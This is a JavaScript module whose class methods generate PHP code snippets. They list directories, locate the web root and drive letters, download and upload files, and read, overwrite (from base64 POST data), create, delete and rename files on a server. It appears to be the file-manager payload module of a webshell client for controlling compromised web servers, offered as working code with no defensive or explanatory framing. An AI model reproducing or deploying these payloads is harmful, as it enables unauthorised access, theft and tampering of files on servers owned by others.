export default class File {
    constructor(arg1, arg2) {
        this.arg1 = arg1
        this.arg2 = arg2
        // console.log(1);
    }


    dir() {
        return `
        $dir = '${arguments[1]}';
        if (!@is_dir($dir)) {
            echo "ERROR:// Path Not Found Or No Permission!";
        } else {
            $res = '';
            foreach (scandir($dir) as $value) {
                if ($value === '.' || $value === '..') continue;
                $file = $dir . $value;
                $res .= $value . '\`\`' . (is_dir($file) ? '1' : '0') . '\`\`' . date("Y/m/d H:i", filemtime($file)) . '\`\`' . @filesize($file);
                $res .= "\\n";
            }
            ${arguments[0]}; 
            echo encode($res); 
        }
        `
    }

    pwd() {
        return `
        $path = dirname($_SERVER["SCRIPT_FILENAME"]);
        if ($path == "") $path = dirname($_SERVER["PATH_TRANSLATED"]);
        if ($path == "") $path = getcwd();
        $root_path = '';
        if (substr($path, 0, 1) != "/") {
            foreach (range("C", "Z") as $L) if (is_dir("{$L}:")) $root_path .= "{$L}:|";
        } else {
            $root_path .= "/";
        } 
        ${arguments[0]}; 
        encode($root_path . '\`\`' . $path); 
        `
    }

    download() {
        return `
        $file = '${this.arg1}';
        header('Content-Type: application/octet-stream');
        header('Content-Disposition:attachment;filename=' . basename($file));
        header('Content-Transfer-Encoding: binary');
        header('Expires:0');
        header('Content-Length:' . filesize($file));

        set_time_limit(0);
        $file = @fopen($file, 'rb');
        while (!feof($file)) {
            print(@fread($file, 1024 * 8));
            ob_flush();
            flush();
        }
       `
    }

    upload() {
        return `
         try {
            if ($_FILES['${this.arg1}']['error']) echo 'ERROR://upload fail';
            else move_uploaded_file($_FILES['${this.arg1}']['tmp_name'], '${this.arg2}'.$_FILES['${this.arg1}']['name']);
        } catch (Exception $e) {
            echo 'ERROR://No Permission';
        }
       `
    }

    createFile() {
        return `
       @file_put_contents('${this.arg1}', '');
       `
    }

    createFolder() {
        return `
       @mkdir('${this.arg1}');
       `
    }

    read() {
        return `
        echo @file_get_contents('${this.arg1}');
        `
    }

    change() {
        return `@file_put_contents('${this.arg1}', base64_decode($_POST['${this.arg2}']));`
    }

    deleteFile() {
        return `
       @unlink('${this.arg1}');
       `
    }

    deleteFolder() {
        return `
       @rmdir('${this.arg1}');
       `
    }

    rename() {
        return `
       @rename('${this.arg1}','${this.arg2}');
       `
    }
}

